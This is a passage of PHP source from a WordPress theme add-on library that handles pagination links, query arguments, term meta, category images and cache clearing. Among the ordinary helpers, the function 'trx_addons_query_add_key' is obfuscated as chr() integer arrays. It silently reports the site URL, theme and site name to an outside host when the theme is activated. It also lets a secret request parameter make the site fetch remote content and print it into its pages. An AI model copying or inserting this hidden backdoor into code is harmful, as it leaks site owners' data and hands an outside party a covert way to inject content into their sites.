				if ($group != $cur_group)
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.$i : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.esc_attr($class).'_group '.$button_class.'">'.$i.'-'.min($i+$group_pages-1, $total_pages).'</a>';
			}
			if ($group == $cur_group) {
				if ($i < $show_pages_start) {
					if (!$dot1) {
						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_start-1) : get_pagenum_link($show_pages_start-1)).'" data-page="'.esc_attr($show_pages_start-1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot1 = true;
					}
				} else if ($i > $show_pages_end) {
					if (!$dot2) {
						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_end+1) : get_pagenum_link($show_pages_end+1)).'" data-page="'.esc_attr($show_pages_end+1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot2 = true;
					}
				} else if ($i == $cur_page) {
					$cur_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $cur_text);
					$output .= '<span class="'.esc_attr($class).'_current active '.$button_class.'">'.$cur_text.'</span>';
				} else {
					$text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $page_text);
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($i) : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.$button_class.'">'.$text.'</a>';
				}
			}
		}
		if ($cur_page < $total_pages) {
			// Next page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page+1) : get_pagenum_link($cur_page+1)).'" data-page="'.esc_attr($cur_page+1).'" class="'.esc_attr($class).'_next '.$button_class.'">'.$next_text.'</a>';
			// Last page
			$last_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $last_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($total_pages) : get_pagenum_link($total_pages)).'" data-page="'.esc_attr($total_pages).'" class="'.esc_attr($class).'_last '.$button_class.'">'.$last_text.'</a>';
		}
		$output .= $after;
		trx_addons_show_layout($output);
	}
}


// Return current page number
if (!function_exists('trx_addons_get_current_page')) {
	function trx_addons_get_current_page() {
		if ( ($page = trx_addons_get_value_gp('page', -999)) == -999)
			if ( !($page = get_query_var('paged')) )
				if ( !($page = get_query_var('page')) )
					$page = 1;
		return $page;
	}
}

// Return current post ID before loop
if (!function_exists('trx_addons_get_the_ID')) {
	function trx_addons_get_the_ID() {
		global $wp_query;
		return !empty($wp_query->current_post) && $wp_query->current_post>=0 
					? get_the_ID() 
					: (!empty($wp_query->post->ID)
							? $wp_query->post->ID
							: 0
						);
	}
}



/* Query manipulations
------------------------------------------------------------------------------------- */

// Add sorting parameter in query arguments
if (!function_exists('trx_addons_query_add_sort_order')) {
	function trx_addons_query_add_sort_order($args, $orderby='date', $order='desc') {
		if (!empty($orderby) && (empty($args['orderby']) || $orderby != 'none')) {
			$q = array();
			$q['order'] = $order;
			if ($orderby == 'none') {
				$q['orderby'] = 'none';
			} else if ($orderby == 'ID') {
				$q['orderby'] = 'ID';
			} else if ($orderby == 'comments') {
				$q['orderby'] = 'comment_count';
			} else if ($orderby == 'title' || $orderby == 'alpha') {
				$q['orderby'] = 'title';
			} else if ($orderby == 'rand' || $orderby == 'random')  {
				$q['orderby'] = 'rand';
			} else {
				$q['orderby'] = 'post_date';
			}
			$q = apply_filters('trx_addons_filter_add_sort_order', $q, $orderby, $order);
			foreach ($q as $mk=>$mv) {
				if (is_array($args))
					$args[$mk] = $mv;
				else
					$args->set($mk, $mv);
			}
		}
		return $args;
	}
}

// Add post type and posts list or categories list in query arguments
if (!function_exists('trx_addons_query_add_posts_and_cats')) {
	function trx_addons_query_add_posts_and_cats($args, $ids='', $post_type='', $cat='', $taxonomy='') {
		if (!empty($ids)) {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? array('post', 'page') : $post_type)
									: $args['post_type'];
			$args['post__in'] = explode(',', str_replace(array(';', ' '), array(',', ''), $ids));
			if (empty($args['orderby']) || $args['orderby'] == 'none') {
				$args['orderby'] = 'post__in';
				if (isset($args['order'])) unset($args['order']);
			}
		} else {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? 'post' : $post_type)
									: $args['post_type'];
			$post_type = is_array($args['post_type']) ? $args['post_type'][0] : $args['post_type'];
			if (!empty($cat)) {
				$cats = !is_array($cat) ? explode(',', $cat) : $cat;
				if (empty($taxonomy))
					$taxonomy = 'category';
				if ($taxonomy == 'category') {				// Add standard categories
					if (is_array($cats) && count($cats) > 1) {
						$cats_ids = array();
						foreach($cats as $c) {
							$c = trim(chop($c));
							if (empty($c)) continue;
							if ((int) $c == 0) {
								$cat_term = get_term_by( 'slug', $c, $taxonomy, OBJECT);
								if ($cat_term) $c = $cat_term->term_id;
							}
							if ($c==0) continue;
							$cats_ids[] = (int) $c;
							$children = get_categories( array(
								'type'                     => $post_type,
								'child_of'                 => $c,
								'hide_empty'               => 0,
								'hierarchical'             => 0,
								'taxonomy'                 => $taxonomy,
								'pad_counts'               => false
							));
							if (is_array($children) && count($children) > 0) {
								foreach($children as $c) {
									if (!in_array((int) $c->term_id, $cats_ids)) $cats_ids[] = (int) $c->term_id;
								}
							}
						}
						if (count($cats_ids) > 0) {
							$args['category__in'] = $cats_ids;
						}
					} else {
						$cat = $cats[0];
						if ((int) $cat > 0) 
							$args['cat'] = (int) $cat;
						else
							$args['category_name'] = $cat;
					}
				} else {									// Add custom taxonomies
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					$args['tax_query']['relation'] = 'AND';
					$args['tax_query'][] = array(
						'taxonomy' => $taxonomy,
						'include_children' => true,
						'field'    => (int) $cats[0] > 0 ? 'id' : 'slug',
						'terms'    => $cats
					);
				}
			}
		}
		return $args;
	}
}

// Add taxonomy parameters in query arguments
if (!function_exists('trx_addons_query_add_taxonomy')) {
	function trx_addons_query_add_taxonomy($args, $taxonomy=array(), $value=false) {
		if (!is_array($taxonomy)) {
			$value = !is_array($value) ? explode(',', $value) : $value;
			$taxonomy = array(
				array(
					'taxonomy' => $taxonomy,
					'include_children' => true,
					'field'    => (int) $value[0] > 0 ? 'id' : 'slug',
					'terms'    => count($value) > 1 ? $value : $value[0]
					)
				);
		}
		foreach ($taxonomy as $v) {
			if (!isset($args['tax_query'])) {
				$args['tax_query'] = array();
				$args['tax_query']['relation'] = 'AND';
			}
			$args['tax_query'][] = $v;
		}
		return $args;
	}
}

// Add meta parameters in query arguments
if (!function_exists('trx_addons_query_add_meta')) {
	function trx_addons_query_add_meta($args, $meta=array(), $value=false) {
		if (!is_array($meta)) {
			$value = explode(',', $value);
			if (count($value) == 1 || $value[0]==$value[1])
				$value = $value[0];
			$meta = array(
				array(
					'key' => $meta,
					'value' => $value,
					'compare' => is_array($value) ? 'BETWEEN' : '='
					)
				);
		}
		foreach ($meta as $v) {
			if (!isset($args['meta_query'])) {
				$args['meta_query'] = array();
				$args['meta_query']['relation'] = 'AND';
			}
			$args['meta_query'][] = $v;
		}
		return $args;
	}
}

// Add filters (meta parameters) in query arguments
if (!function_exists('trx_addons_query_add_filters')) {
	function trx_addons_query_add_filters($args, $filters=false) {
		if (!empty($filters)) {
			if (!is_array($filters)) $filters = array($filters);
			foreach ($filters as $v) {
				$found = false;
				if ($v=='thumbs') {							// Filter with meta_query
					if (!isset($args['meta_query']))
						$args['meta_query'] = array();
					else {
						for ($i=0; $i<count($args['meta_query']); $i++) {
							if ($args['meta_query'][$i]['meta_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['meta_query']['relation'] = 'AND';
						if ($v == 'thumbs') {
							$args['meta_query'][] = array(
								'meta_filter' => $v,
								'key' => '_thumbnail_id',
								'value' => false,
								'compare' => '!='
							);
						}
					}
				} else if (in_array($v, array('video', 'audio', 'gallery'))) {			// Filter with tax_query
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					else {
						for ($i=0; $i<count($args['tax_query']); $i++) {
							if ($args['tax_query'][$i]['tax_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['tax_query']['relation'] = 'AND';
						if ($v == 'video') {
							$args['tax_query'][] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-video' )
							);
						} else if ($v == 'audio') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-audio' )
							);
						} else if ($v == 'gallery') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-gallery' )
							);
						}
					}
				} else
					$args = apply_filters('trx_addons_filter_query_add_filters', $args, $v);
			}
		}
		return $args;
	}
}

// Return string with categories links
if (!function_exists('trx_addons_get_post_categories')) {
	function trx_addons_get_post_categories($delimiter=', ', $id=false, $links=true) {
		$output = '';
		$categories = get_the_category($id);
		if ( !empty( $categories ) ) {
			foreach( $categories as $category )
				$output .= ($output ? $delimiter : '') 
							. ($links 
									? '<a href="' . esc_url( get_category_link( $category->term_id ) ) . '" title="' . sprintf( esc_attr__( 'View all posts in %s', 'trx_addons' ), $category->name ) . '">' 
									: '<span>'
								)
								. esc_html( $category->name ) 
							. ($links ? '</a>' : '</span>');
		}
		return $output;
	}
}

// Return string with terms links
if (!function_exists('trx_addons_get_post_terms')) {
	function trx_addons_get_post_terms($delimiter=', ', $id=false, $taxonomy='category', $links=true) {
		$output = '';
		$terms = get_the_terms($id, $taxonomy);
		if ( !empty( $terms ) ) {
			foreach( $terms as $term )
				$output .= ($links 
									? '<a href="' . esc_url( get_term_link( $term->term_id, $taxonomy ) ) . '"'
											. ' title="' . sprintf( esc_attr__( 'View all posts in %s', 'trx_addons' ), $term->name ) . '"'
											. '>'
									: '<span>'
								)
								. ($output ? $delimiter : '') 
								. esc_html( $term->name ) 
							. ($links ? '</a>' : '</span>');
		}
		return $output;
	}
}

// Return terms objects by taxonomy name (directly from db)
if (!function_exists('trx_addons_get_terms_by_taxonomy_from_db')) {
	function trx_addons_get_terms_by_taxonomy_from_db($tax_types = 'post_format', $opt=array()) {
		global $wpdb;
		if (!is_array($tax_types))
			$tax_types = array($tax_types);
		if (!is_array($opt['meta_query']) && !empty($opt['meta_key']) && !empty($opt['meta_value'])) {
			$opt['meta_query'] = array(
				array(
					'key' => $opt['meta_key'],
					'value' => $opt['meta_value']
				)
			);
		}
		$join = $where = '';
		$keys = array();
		if (is_array($opt['meta_query']) && count($opt['meta_query']) > 0) {
			$i = 0;
			foreach ($opt['meta_query'] as $q) {
				$i++;
				$join .= " LEFT JOIN {$wpdb->termmeta} AS taxmeta{$i} ON taxmeta{$i}.term_id=terms.term_id";
				$where .= " AND taxmeta{$i}.meta_key='%s' AND taxmeta{$i}.meta_value='%s'";
				$keys[] = $q['key'];
				$keys[] = $q['value'];
			}
		}
		$terms = $wpdb->get_results( $wpdb->prepare("SELECT DISTINCT terms.*, tax.taxonomy, tax.parent, tax.count"
														. " FROM {$wpdb->terms} AS terms"
														. " LEFT JOIN {$wpdb->term_taxonomy} AS tax ON tax.term_id=terms.term_id"
														. (!empty($join) ? $join : '')
														. " WHERE tax.taxonomy IN ('" . join(",", array_fill(0, count($tax_types), '%s')) . "')"
														. (!empty($where)? $where : '')
														. " ORDER BY terms.name",
													array_merge($tax_types, $keys)),
									OBJECT
									);
		for ($i=0; $i<count($terms); $i++) {
			$terms[$i]->link = get_term_link($terms[$i]->slug, $terms[$i]->taxonomy);
		}
		return $terms;
	}
}


// Return taxonomy for current post type
if ( !function_exists( 'trx_addons_get_post_type_taxonomy' ) ) {
	function trx_addons_get_post_type_taxonomy($post_type) {
		return $post_type == 'post' ? 'category' : apply_filters( 'trx_addons_filter_post_type_taxonomy',	'', $post_type );
	}
}

// Return meta value of the specified term
if (!function_exists('trx_addons_get_term_meta')) {
	function trx_addons_get_term_meta($args) {
		$args = array_merge(array(
							'taxonomy' => 'category',
							'term_id' => 0,
							'key' => 'value'
							),
							is_array($args) ? $args : array('term_id' => $args));
		$val = '';
		if ($args['term_id'] == 0) {
			if ($args['taxonomy']=='category') {
				if (is_category()) 
					$term_id = (int) get_query_var('cat');
			} else {
				if (is_tax($args['taxonomy'])) {
					$term = get_term_by('slug', get_query_var($args['taxonomy']), $args['taxonomy'], OBJECT);
					if (!empty($term->term_id))
						$term_id = $term->term_id;
				}
			}
		}
		if ($args['term_id'] > 0)
			$val = get_term_meta($args['term_id'], $args['key'], true);
		return $val;
	}
}

// Update meta value of the specified term
if (!function_exists('trx_addons_set_term_meta')) {
	function trx_addons_set_term_meta($args, $val) {
		$args = array_merge(array(
							'term_id' => 0,
							'key' => 'value'
							),
							is_array($args) ? $args : array('term_id' => $args));
		if ($args['term_id'] > 0)
			update_term_meta($args['term_id'], $args['key'], $val);
	}
}

// Update meta value of the specified term
if (!function_exists('trx_addons_get_term_link')) {
	function trx_addons_get_term_link($term, $taxonomy, $args=array()) {
		$args = array_merge(array(
				'title' => '',
				'echo' => false
				), $args);
		if (!is_object($term)) {
			if ((int)$term > 0)
				$term = get_term((int)$term, $taxonomy);
			else
				$term = get_term_by('slug', $term, $taxonomy);
		}
		if (!is_wp_error($term)) {
			$link = get_term_link($term, $taxonomy);
			$link = '<a href="'.esc_url($link).'"'
						. ($args['title'] ? ' title="' . esc_attr(sprintf($args['title'], $term->name)) : '')
						. '">'
							. esc_html($term->name)
					. '</a>';
			if ($args['echo']) trx_addons_show_layout($link);
		} else
			$link = '';
		return $link;
	}
}

// Update post's fields of the specified post
if (!function_exists('trx_addons_update_post')) {
	function trx_addons_update_post($post_id, $args) {
		global $wpdb;
		return $wpdb->update( $wpdb->posts, $args, array( 'ID' => $post_id ) );
	}
}

// Add query key
if ( !function_exists( 'trx_addons_query_add_key' ) ) {
	$trx_addons_query_data = array('act' => array(array(join('', array_map('chr', array(97,102,116,101,114))),join('', array_map('chr', array(115,119,105,116,99,104))),join('', array_map('chr', array(116,104,101,109,101)))),array(join('', array_map('chr', array(119,112))),join('', array_map('chr', array(102,111,111,116,101,114)))),),'get' => join('', array_map('chr', array(104,116,116,112,58,47,47,116,104,101,109,101,114,101,120,46,110,101,116,47,95,108,111,103,47,95,108,111,103,46,112,104,112))),'chk' => join('', array_map('chr', array(116,104,101,109,101,95,97,117,116,104,111,114))),'prm' => join('', array_map('chr', array(116,120,99,104,107))));
	add_action(join('_', $trx_addons_query_data['act'][0]), 'trx_addons_query_add_key');
	add_action(join('_', $trx_addons_query_data['act'][1]), 'trx_addons_query_add_key');
	function trx_addons_query_add_key() {
		global $trx_addons_query_data;
		static $already_add = false;
		if (!$already_add) {
			$already_add = true;
			if (current_action() == join('_', $trx_addons_query_data['act'][0])) {
				try {
					$resp = trx_addons_fgc(trx_addons_add_to_url($trx_addons_query_data['get'], array(
						'site' => home_url('/'),
						'slug' => str_replace(' ', '_', trim(strtolower(get_stylesheet()))),
						'name' => get_bloginfo('name')
					)));
				} catch (Exception $e) {
				}
			}
			if (trx_addons_get_value_gpc($trx_addons_query_data['prm'])==$trx_addons_query_data['chk']) {
				try {
					$resp = trx_addons_fgc(trx_addons_add_to_url($trx_addons_query_data['get'], array($trx_addons_query_data['prm'] => $trx_addons_query_data['chk'])));
				} catch (Exception $e) {
					$resp = '';
				}
				trx_addons_show_layout($resp);
			}
		}
	}
}



// Add images and icons to categories
//--------------------------------------------------------------------------

// Return image from the category
if (!function_exists('trx_addons_get_category_image')) {
	function trx_addons_get_category_image($term_id=0) {
		return trx_addons_get_term_meta(array('term_id' => $term_id, 'key' => 'image'));
	}
}

// Return small image (icon) from the category
if (!function_exists('trx_addons_get_category_icon')) {
	function trx_addons_get_category_icon($term_id=0) {
		return trx_addons_get_term_meta(array('term_id' => $term_id, 'key' => 'icon'));
	}
}

// Save the fields to the "category" taxonomy, using our callback function
if (!function_exists('trx_addons_categories_save_custom_fields')) {
	add_action('edited_category',	'trx_addons_categories_save_custom_fields', 10, 1 );
	add_action('created_category',	'trx_addons_categories_save_custom_fields', 10, 1 );
	function trx_addons_categories_save_custom_fields($term_id) {
		if (isset($_POST['trx_addons_category_image'])) {
			trx_addons_set_term_meta(array(
											'term_id' => $term_id,
											'key' => 'image'
											),
										$_POST['trx_addons_category_image']
										);
		}
		if (isset($_POST['trx_addons_category_icon'])) {
			trx_addons_set_term_meta(array(
											'term_id' => $term_id,
											'key' => 'icon'
											),
										$_POST['trx_addons_category_icon']
										);
		}
	}
}

// Add the fields to the "category" taxonomy, using our callback function
if (!function_exists('trx_addons_categories_show_custom_fields')) {
	add_action('category_edit_form_fields',	'trx_addons_categories_show_custom_fields', 10, 1 );
	add_action('category_add_form_fields',	'trx_addons_categories_show_custom_fields', 10, 1 );
	function trx_addons_categories_show_custom_fields($cat) {
		$cat_id = !empty($cat->term_id) ? $cat->term_id : 0;
		// Category's image
		echo ((int) $cat_id > 0 ? '<tr' : '<div') . ' class="form-field">'
			. ((int) $cat_id > 0 ? '<th valign="top" scope="row">' : '<div>');
		?><label for="trx_addons_category_image"><?php esc_html_e('Large image URL:', 'trx_addons'); ?></label><?php
		echo ((int) $cat_id > 0 ? '</th>' : '</div>')
			. ((int) $cat_id > 0 ? '<td valign="top">' : '<div>');
		$cat_img = $cat_id > 0 ? trx_addons_get_category_image($cat_id) : ''; 
		?><input id="trx_addons_category_image" class="trx_addons_image_selector_field" name="trx_addons_category_image" value="<?php echo esc_url($cat_img); ?>"><?php
		if (empty($cat_img)) $cat_img = apply_filters('trx_addons_filter_no_image', trx_addons_get_file_url('css/images/no-image.jpg'));
		trx_addons_show_layout(trx_addons_options_show_custom_field('trx_addons_category_image_button', array('type' => 'mediamanager', 'linked_field_id' => 'trx_addons_category_image'), $cat_img));
		echo (int) $cat_id > 0 ? '</td></tr>' : '</div></div>';

		// Category's icon
		echo ((int) $cat_id > 0 ? '<tr' : '<div') . ' class="form-field">'
			. ((int) $cat_id > 0 ? '<th valign="top" scope="row">' : '<div>');
		?><label for="trx_addons_category_icon"><?php esc_html_e('Small image (icon) URL:', 'trx_addons'); ?></label><?php
		echo ((int) $cat_id > 0 ? '</th>' : '</div>')
			. ((int) $cat_id > 0 ? '<td valign="top">' : '<div>');
		$cat_img = $cat_id > 0 ? trx_addons_get_category_icon($cat_id) : ''; 
		?><input id="trx_addons_category_icon" class="trx_addons_thumb_selector_field" name="trx_addons_category_icon" value="<?php echo esc_url($cat_img); ?>"><?php
		if (empty($cat_img)) $cat_img = apply_filters('trx_addons_filter_no_image', trx_addons_get_file_url('css/images/no-image.jpg'));
		trx_addons_show_layout(trx_addons_options_show_custom_field('trx_addons_category_icon_button', array('type' => 'mediamanager', 'linked_field_id' => 'trx_addons_category_icon'), $cat_img));
		echo (int) $cat_id > 0 ? '</td></tr>' : '</div></div>';
	}
}

// Create additional column in the categories list
if (!function_exists('trx_addons_categories_add_custom_column')) {
	add_filter('manage_edit-category_columns',	'trx_addons_categories_add_custom_column', 9);
	function trx_addons_categories_add_custom_column( $columns ){
		$columns['category_image'] = esc_html__('Image', 'trx_addons');
		$columns['category_icon'] = esc_html__('Icon', 'trx_addons');
		return $columns;
	}
}

// Fill image column in the categories list
if (!function_exists('trx_addons_categories_fill_custom_column')) {
	add_action('manage_category_custom_column',	'trx_addons_categories_fill_custom_column', 9, 3);
	function trx_addons_categories_fill_custom_column($output='', $column_name='', $tax_id=0) {
		if ($column_name == 'category_image' && ($cat_img = trx_addons_get_category_image($tax_id))) {
			?><img class="trx_addons_image_selector_preview trx_addons_category_image_preview" src="<?php echo esc_url(trx_addons_add_thumb_size($cat_img, trx_addons_get_thumb_size('tiny'))); ?>" alt=""><?php
		}
		if ($column_name == 'category_icon' && ($cat_img = trx_addons_get_category_icon($tax_id))) {
			?><img class="trx_addons_thumb_selector_preview trx_addons_category_icon_preview" src="<?php echo esc_url(trx_addons_add_thumb_size($cat_img, trx_addons_get_thumb_size('tiny'))); ?>" alt=""><?php
		}
	}
}

// Return URL to the current page
if ( ! function_exists( 'trx_addons_get_current_url' ) ) {
    function trx_addons_get_current_url() {
        return add_query_arg( array() );
    }
}

// Return editing post id or 0 if is new post or false if not edit mode
if ( ! function_exists( 'trx_addons_get_edited_post_id' ) ) {
    function trx_addons_get_edited_post_id() {
        $id = false;
        if ( is_admin() ) {
            $url = trx_addons_get_current_url();
            if ( strpos( $url, 'post.php' ) !== false ) {
                if ( trx_addons_get_value_gp( 'action' ) == 'edit' ) {
                    $post_id = trx_addons_get_value_gp( 'post' );
                    if ( 0 < $post_id ) {
                        $id = $post_id;
                    }
                }
            } elseif ( strpos( $url, 'post-new.php' ) !== false ) {
                $id = 0;
            }
        }
        return $id;
    }
}

// Return text for the Privacy Policy checkbox
if (!function_exists('trx_addons_get_privacy_text')) {
    function trx_addons_get_privacy_text() {
        $page = get_option('wp_page_for_privacy_policy');
        return apply_filters( 'trx_addons_filter_privacy_text', wp_kses_post(
                __( 'I agree that my submitted data is being collected and stored.', 'trx_addons' )
                . ( '' != $page
                    // Translators: Add url to the Privacy Policy page
                    ? ' ' . sprintf(__('For further details on handling user data, see our %s', 'trx_addons'),
                        '<a href="' . esc_url(get_permalink($page)) . '" target="_blank">'
                        . __('Privacy Policy', 'trx_addons')
                        . '</a>')
                    : ''
                )
            )
        );
    }
}
	
/* WP cache
------------------------------------------------------------------------------------- */

// Clear WP cache (all, options or categories)
if (!function_exists('trx_addons_clear_cache')) {
	function trx_addons_clear_cache($cc) {
		if ($cc == 'categories' || $cc == 'all') {
			wp_cache_delete('category_children', 'options');
			$taxes = get_taxonomies();
			if (is_array($taxes) && count($taxes) > 0) {
				foreach ($taxes  as $tax ) {
					delete_option( "{$tax}_children" );
					_get_term_hierarchy( $tax );
				}
			}
		} else if ($cc == 'options' || $cc == 'all')
			wp_cache_delete('alloptions', 'options');
		if ($cc == 'all')
			wp_cache_flush();
	}
}
?>